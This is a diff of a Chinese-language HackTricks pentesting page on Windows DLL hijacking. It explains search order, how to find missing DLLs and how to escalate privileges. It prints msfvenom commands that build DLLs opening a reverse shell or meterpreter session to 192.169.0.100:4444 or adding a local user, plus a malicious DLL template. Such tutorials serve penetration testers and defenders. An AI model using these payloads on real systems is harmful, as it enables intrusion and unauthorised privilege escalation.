@@ -1,112 +1,114 @@
-# DLL劫持
+# Dll 劫持
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者你想要获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[NFT](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
+* 你在一家**网络安全公司**工作吗？你想在**HackTricks**中看到你的**公司广告**吗？或者你想要访问**PEASS的最新版本或下载HackTricks的PDF**？查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)系列
+* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
+* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**推特**上**关注**我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **通过向** [**hacktricks仓库**](https://github.com/carlospolop/hacktricks) **提交PR来分享你的黑客技巧** 和 [**hacktricks-cloud仓库**](https://github.com/carlospolop/hacktricks-cloud)。
 
 </details>
 
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
+<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
 
-如果你对**黑客职业**感兴趣并且想要攻破不可攻破的目标 - **我们正在招聘！**（需要流利的波兰语书面和口语表达能力）。
+如果你对**黑客职业**感兴趣并且想要黑掉不可黑的 - **我们正在招聘！** (_需要流利的波兰语书写和口语_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
 ## 定义
 
-首先，让我们先了解一下定义。DLL劫持在最广义上是指**欺骗一个合法/可信任的应用程序加载任意DLL**。术语如_DLL搜索顺序劫持_、_DLL加载顺序劫持_、_DLL欺骗_、_DLL注入_和_DLL侧加载_经常被错误地用来表示相同的意思。
+首先，让我们先弄清楚定义。从广义上讲，DLL劫持是**欺骗合法/受信任的应用程序加载任意DLL**。术语如_DLL搜索顺序劫持_、_DLL加载顺序劫持_、_DLL欺骗_、_DLL注入_ 和 _DLL侧加载_ 经常被错误地用来表示相同的意思。
 
-DLL劫持可以用于**执行**代码、获取**持久性**和**提升权限**。在这三种情况中，**最不可能**发现的是**提升权限**。然而，由于这是权限提升部分的一部分，我将重点介绍这个选项。此外，无论目标是什么，DLL劫持的执行方式都是相同的。
+DLL劫持可以用来**执行**代码、获得**持久性**和**提升权限**。在这三个中，**最不可能**找到的是**提升权限**。然而，由于这是权限提升部分的一部分，我将专注于这个选项。另外，请注意，无论目标是什么，DLL劫持的执行方式都是相同的。
 
 ### 类型
 
-有多种方法可供选择，成功与否取决于应用程序配置加载所需DLL的方式。可能的方法包括：
+有多种方法可以选择，成功与否取决于应用程序配置加载其所需DLL的方式。可能的方法包括：
 
-1. **DLL替换**：用恶意DLL替换合法DLL。这可以与_DLL代理_结合使用\[[2](https://kevinalmansa.github.io/application%20security/DLL-Proxying/)]，以确保原始DLL的所有功能保持完整。
-2. **DLL搜索顺序劫持**：应用程序指定的没有路径的DLL按照特定顺序在固定位置进行搜索\[[3](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)]。通过将恶意DLL放在实际DLL之前进行搜索顺序劫持。这有时包括目标应用程序的工作目录。
-3. **幻影DLL劫持**：在合法应用程序尝试加载的缺失/不存在的DLL位置放置恶意DLL\[[4](http://www.hexacorn.com/blog/2013/12/08/beyond-good-ol-run-key-part-5/)]。
-4. **DLL重定向**：更改DLL的搜索位置，例如通过编辑`%PATH%`环境变量或`.exe.manifest` / `.exe.local`文件以包含包含恶意DLL的文件夹\[[5](https://docs.microsoft.com/en-gb/windows/win32/sbscs/application-manifests), [6](https://docs.microsoft.com/en-gb/windows/win32/dlls/dynamic-link-library-redirection)]。
-5. **WinSxS DLL替换**：在目标DLL的相关WinSxS文件夹中用恶意DLL替换合法DLL。通常称为DLL侧加载\[[7](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf)]。
-6. **相对路径DLL劫持**：将合法应用程序复制（并可选地重命名）到用户可写入的文件夹中，与恶意DLL放在一起。在使用方式上，它与（签名的）二进制代理执行\[[8](https://attack.mitre.org/techniques/T1218/)]有相似之处。这种方法的变体有点自相矛盾，被称为“_bring your own LOLbin_”\[[9](https://www.microsoft.com/security/blog/2019/09/26/bring-your-own-lolbin-multi-stage-fileless-nodersok-campaign-delivers-rare-node-js-based-malware/)]，其中合法应用程序与恶意DLL一起提供（而不是从受害者机器上的合法位置复制）。
+1. **DLL替换**：用恶意DLL替换合法DLL。这可以与_DLL代理_结合使用，确保原始DLL的所有功能保持完整。
+2. **DLL搜索顺序劫持**：应用程序未指定路径的DLL将按特定顺序在固定位置搜索。通过将恶意DLL放在实际DLL之前搜索的位置来劫持搜索顺序。这有时包括目标应用程序的工作目录。
+3. **幽灵DLL劫持**：在合法应用程序尝试加载的缺失/不存在的DLL位置放置恶意DLL。
+4. **DLL重定向**：更改搜索DLL的位置，例如通过编辑`%PATH%`环境变量，或`.exe.manifest` / `.exe.local`文件包含包含恶意DLL的文件夹。
+5. **WinSxS DLL替换**：在目标DLL的相关WinSxS文件夹中用恶意DLL替换合法DLL。通常被称为DLL侧加载。
+6. **相对路径DLL劫持**：将合法应用程序复制（并可选重命名）到用户可写文件夹，与恶意DLL一起。这种使用方式与（签名的）二进制代理执行有相似之处。这种变体有时被（有些矛盾地）称为‘_带上你自己的LOLbin_’，其中合法应用程序与恶意DLL一起带来（而不是从受害者机器上的合法位置复制）。
 
-## 查找缺失的DLL
+## 查找缺失的Dlls
 
-在系统中查找缺失的DLL的最常见方法是运行[procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)，**设置以下两个过滤器**：
+在系统内查找缺失Dlls的最常见方法是运行来自sysinternals的[procmon]，**设置**以下**两个过滤器**：
 
 ![](<../../.gitbook/assets/image (311).png>)
 
 ![](<../../.gitbook/assets/image (313).png>)
 
-然后只显示**文件系统活动**：
+并只显示**文件系统活动**：
 
 ![](<../../.gitbook/assets/image (314).png>)
 
-如果你正在寻找**一般缺失的DLL**，你可以让它运行**几秒钟**。\
-如果你正在寻找**特定可执行文件中缺失的DLL**，你应该设置**另一个过滤器，如"进程名称" "包含" "\<exec name>"**，执行它，并停止捕获事件。
-## 利用缺失的 DLL 进行提权
+如果你在寻找**一般缺失的dlls**，你可以**让它运行几秒钟**。\
+如果你在寻找**特定可执行文件内的缺失dll**，你应该设置**另一个过滤器如"进程名称" "包含" "\<exec name>"，执行它，并停止捕获事件**。
 
-为了提升权限，我们最好的机会是能够**编写一个 DLL，让一个特权进程尝试加载**它在某个**将要被搜索的位置**。因此，我们将能够在一个**在原始 DLL 之前被搜索的文件夹**中**编写**一个 DLL（奇怪的情况），或者我们将能够在一个**将要被搜索的文件夹**中**编写**一个 DLL，而原始的** DLL 在任何文件夹中都不存在**。
+## 利用缺失的Dlls
 
-### DLL 搜索顺序
+为了提升权限，我们最好的机会是能够**写一个dll，一个特权进程将尝试加载**，在某个**将要被搜索的地方**。因此，我们将能够**写**一个dll在一个**文件夹**里，这个文件夹里的**dll在**原始dll所在的文件夹之前被搜索（奇怪的情况），或者我们将能够**写在某个文件夹里，dll将被搜索**，而原始的**dll不存在**于任何文件夹。
 
-**在**[**Microsoft 文档**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)**中，你可以找到 DLL 的具体加载方式。**
+### Dll搜索顺序
 
-一般来说，**Windows 应用程序**会使用**预定义的搜索路径来查找 DLL**，并按照特定的顺序检查这些路径。DLL 劫持通常是通过将恶意 DLL 放置在其中一个文件夹中，同时确保该 DLL 在合法 DLL 之前被找到。通过让应用程序指定 DLL 的绝对路径，可以缓解这个问题。
+**在** [**Microsoft文档**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **中你可以找到Dlls的具体加载方式。**
 
-你可以在**32 位系统上**看到 DLL 搜索顺序如下：
+通常，**Windows应用程序**会使用**预定义的搜索路径来查找DLL**，并且会按特定顺序检查这些路径。DLL劫持通常通过将恶意DLL放置在这些文件夹中的一个，同时确保DLL在合法DLL之前被找到。通过让应用程序指定它需要的DLL的绝对路径可以缓解这个问题。
+
+你可以在下面看到**32位**系统上的**DLL搜索顺序**：
 
 1. 应用程序加载的目录。
-2. 系统目录。使用[**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)函数获取该目录的路径。(_C:\Windows\System32_)
-3. 16 位系统目录。没有函数可以获取该目录的路径，但是会进行搜索。(_C:\Windows\System_)
-4. Windows 目录。使用[**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)函数获取该目录的路径。(_C:\Windows_)
+2. 系统目录。使用[**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)函数获取此目录的路径。（_C:\Windows\System32_）
+3. 16位系统目录。没有函数可以获取此目录的路径，但它会被搜索。（_C:\Windows\System_）
+4. Windows目录。使用[**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)函数获取此目录的路径。
+1. (_C:\Windows_)
 5. 当前目录。
-6. 在 PATH 环境变量中列出的目录。请注意，这不包括由**App Paths**注册表键指定的每个应用程序路径。计算 DLL 搜索路径时，不使用**App Paths**键。
+6. 列在PATH环境变量中的目录。注意，这不包括由**App Paths**注册表键指定的每个应用程序路径。计算DLL搜索路径时不使用**App Paths**键。
 
-这是启用**SafeDllSearchMode**的**默认**搜索顺序。当禁用此功能时，当前目录将升至第二位。要禁用此功能，请创建**HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode**注册表值，并将其设置为 0（默认启用）。
+这是启用**SafeDllSearchMode**时的**默认**搜索顺序。当它被禁用时，当前目录升级到第二位。要禁用此功能，请创建**HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode**注册表值并将其设置为0（默认为启用）。
 
-如果使用[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa)函数调用**LOAD\_WITH\_ALTERED\_SEARCH\_PATH**，搜索将从**LoadLibraryEx**正在加载的可执行模块的目录开始。
+如果调用[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa)函数并带有**LOAD\_WITH\_ALTERED\_SEARCH\_PATH**，则搜索从**LoadLibraryEx**正在加载的可执行模块的目录开始。
 
-最后，请注意**DLL 可以通过指定绝对路径而不仅仅是名称来加载**。在这种情况下，该 DLL **只会在该路径中被搜索**（如果 DLL 有任何依赖项，它们将按名称搜索，就像刚加载的一样）。
+最后，请注意，**可以通过指定绝对路径而不仅仅是名称来加载dll**。在这种情况下，dll**只会在那个路径中被搜索**（如果dll有任何依赖，它们将被视为仅通过名称加载）。
 
-还有其他改变搜索顺序的方法，但我不会在这里解释它们。
+还有其他方法可以改变搜索顺序，但我不会在这里解释它们。
 
-#### Windows 文档中的 DLL 搜索顺序异常
+#### Windows文档中dll搜索顺序的例外
 
-* 如果**已经在内存中加载了具有相同模块名称的 DLL**，系统在解析到已加载的 DLL 之前，仅检查重定向和清单。**系统不会搜索该 DLL**。
-* 如果 DLL 在应用程序运行的 Windows 版本的**已知 DLL 列表**中，**系统将使用其自己的已知 DLL 的副本**（以及已知 DLL 的依赖 DLL，如果有的话），**而不是搜索**该 DLL。有关当前系统上已知 DLL 的列表，请参阅以下注册表键：**HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**。
-* 如果 DLL 有依赖项，系统将按照它们只使用**模块名称**加载的方式搜索依赖 DLL。即使第一个 DLL 是通过指定完整路径加载的，这也是正确的。
+* 如果内存中已经加载了**具有相同模块名称的DLL**，系统只检查重定向和清单，然后解析到已加载的DLL，无论它在哪个目录中。**系统不会搜索DLL**。
+* 如果DLL在应用程序运行的Windows版本的**已知DLL列表**上，系统使用其已知DLL的副本（以及任何依赖的已知DLL）**而不是搜索**DLL。要查看当前系统上已知DLL的列表，请参阅以下注册表键：**HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**。
+* 如果**DLL有依赖项**，系统**搜索**依赖DLL，就好像它们是仅用其**模块名称**加载的。即使第一个DLL是通过指定完整路径加载的，这也是真的。
 
 ### 提升权限
 
 **要求**：
 
-* 找到一个以**其他权限**（水平/横向移动）运行/将要运行的进程，该进程**缺少一个 DLL**。
-* 在任何**将要被搜索的文件夹**（可能是可执行文件目录或系统路径中的某个文件夹）上具有**写权限**。
+* **找到一个进程**，它运行/将以**其他权限**运行（水平/横向移动），它**缺少一个dll**。
+* 在任何**文件夹**中拥有**写权限**，dll将在那里被**搜索**（可能是可执行目录或系统路径内的某个文件夹）。
 
-是的，要求很难找到，因为**默认情况下很难找到一个缺少 DLL 的特权可执行文件**，而且**在系统路径文件夹中默认情况下无法获得写权限**。但是，在配置错误的环境中，这是可能的。\
-如果你幸运地满足了这些要求，你可以查看[UACME](https://github.com/hfiref0x/UACME)项目。即使该项目的**主要目标是绕过 UAC**，你可能会在那里找到一个适用于你所使用的 Windows 版本的 DLL 劫持的 PoC（可能只需更改你具有写权限的文件夹的路径）。
+是的，要求很难找到，因为**默认情况下，找到一个缺少dll的特权可执行文件是有点奇怪的**，在系统路径文件夹中拥有写权限更是**更奇怪**（默认情况下你不能）。但是，在配置不当的环境中，这是可能的。\
+如果你幸运地发现自己满足要求，你可以查看[UACME](https://github.com/hfiref0x/UACME)项目。即使**该项目的主要目标是绕过UAC**，你也可能会在那里找到一个**PoC**，用于你可以使用的Windows版本（可能只是更改你有写权限的文件夹路径）。
 
-请注意，你可以通过执行以下操作**检查文件夹中的权限**：
+请注意，你可以**通过执行以下操作来检查你在文件夹中的权限**：
 ```bash
 accesschk.exe -dqv "C:\Python27"
 icacls "C:\Python27"
 ```
-并**检查路径中所有文件夹的权限**：
+检查 **PATH** 中所有文件夹的权限：
 ```bash
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
 ```
-您还可以使用以下命令检查可执行文件的导入项和动态链接库的导出项：
+你也可以使用以下方法来检查一个可执行文件的导入和一个dll的导出：
 ```c
 dumpbin /imports C:\path\Tools\putty\Putty.exe
 dumpbin /export /path/file.dll
 ```
-要了解如何滥用Dll劫持以提升权限并具有在系统路径文件夹中写入权限的完整指南，请查看：
+为了全面指导如何**滥用Dll劫持来提升权限**，具有在**系统路径文件夹**中写入权限的检查：
 
 {% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
 [writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
@@ -114,39 +116,39 @@ dumpbin /export /path/file.dll
 
 ### 自动化工具
 
-[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)将检查您是否具有对系统路径中任何文件夹的写入权限。\
-其他有趣的自动化工具来发现此漏洞是**PowerSploit函数**：_Find-ProcessDLLHijack_，_Find-PathDLLHijack_和_Write-HijackDll_。
+[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)会检查你是否拥有系统PATH内任一文件夹的写入权限。\
+其他发现此漏洞的有趣自动化工具包括**PowerSploit函数**：_Find-ProcessDLLHijack_、_Find-PathDLLHijack_ 和 _Write-HijackDll_。
 
 ### 示例
 
-如果您找到了一个可利用的场景，成功利用它的最重要的事情之一将是**创建一个导出至少所有可执行文件将从中导入的函数的dll**。无论如何，请注意，Dll劫持在从中间完整性级别升级到高级（绕过UAC）或从高级升级到SYSTEM方面非常方便。您可以在此dll劫持研究中找到一个创建有效dll的示例，该研究专注于用于执行的dll劫持：[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
-此外，在下一节中，您可以找到一些可能有用作模板或创建具有非必需导出函数的dll的基本dll代码。
+如果你发现了一个可利用的场景，成功利用它最重要的事情之一将是**创建一个至少导出可执行文件将从中导入的所有函数的dll**。无论如何，请注意Dll劫持在[从中等完整性级别提升到高级别 **（绕过UAC）**](../authentication-credentials-uac-and-efs.md#uac)或从[**高完整性提升到SYSTEM**](./#from-high-integrity-to-system)**时非常方便。** 你可以在这个专注于执行的dll劫持研究中找到一个**如何创建有效dll**的示例：[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**\
+此外，在**下一节**中，你可以找到一些**基本的dll代码**，这些代码可能作为**模板**或创建**导出非必需函数的dll**时很有用。
 
 ## **创建和编译Dlls**
 
-### **Dll代理化**
+### **Dll代理**
 
-基本上，**Dll代理**是一种能够在加载时执行恶意代码的Dll，但也能够通过将所有调用传递给真实库来作为预期的方式**公开**和**工作**。
+基本上，**Dll代理**是一种能够**在加载时执行恶意代码**，同时通过**转发所有调用到真实库**，来**暴露**并**按预期工作**的Dll。
 
-使用工具\*\*\*\*[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant)\*\*\*\*或\*\*\*\*[**Spartacus**](https://github.com/Accenture/Spartacus)\*\*\*\*，您实际上可以**指定一个可执行文件并选择要代理化的库**，然后**生成一个代理化的dll**，或者**指定Dll并生成一个代理化的dll**。
+使用工具\*\*\*\* [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) \*\*\*\* 或 \*\*\*\* [**Spartacus**](https://github.com/Accenture/Spartacus) \*\*\*\*，你实际上可以**指定一个可执行文件并选择你想要代理的库**，并**生成一个代理dll**，或者**指定Dll**并**生成一个代理dll**。
 
 ### **Meterpreter**
 
-**获取反向shell（x64）：**
+**获取反向shell (x64)：**
 ```bash
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-**获取一个meterpreter（x86）：**
+**获取 meterpreter (x86)：**
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-**创建一个用户（x86 我没有看到 x64 版本）：**
+**创建用户（x86 我没有看到 x64 版本）：**
 ```
 msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
 ### 你自己的
 
-请注意，在多种情况下，你编译的 Dll 必须**导出多个函数**，这些函数将由受害进程加载，如果这些函数不存在，**二进制文件将无法加载**它们，从而导致**攻击失败**。
+请注意，在多数情况下，你编译的Dll必须**导出多个函数**，这些函数将被受害进程加载，如果这些函数不存在，**二进制文件将无法加载**它们，**漏洞利用将失败**。
 ```c
 // Tested in Win10
 // i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
@@ -227,9 +229,9 @@ break;
 return TRUE;
 }
 ```
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
+<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
 
-如果你对**黑客职业**感兴趣并想要攻破不可攻破的系统 - **我们正在招聘！**（需要流利的波兰语书写和口语能力）。
+如果您对**黑客职业**感兴趣，并且想要黑进那些不可黑的系统 - **我们正在招聘！**（_需要流利的波兰语书写和口语_）。
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
@@ -237,10 +239,10 @@ return TRUE;
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取最新版本的PEASS或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品 - [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
+* 您在**网络安全公司**工作吗？您想在**HackTricks**中看到您的**公司广告**吗？或者您想要获得**PEASS最新版本**或**以PDF格式下载HackTricks**吗？查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)收藏
+* 获取[**官方PEASS & HackTricks周边商品**](https://peass.creator-spring.com)
+* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter**上**关注**我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **通过向** [**hacktricks仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**
 
 </details>
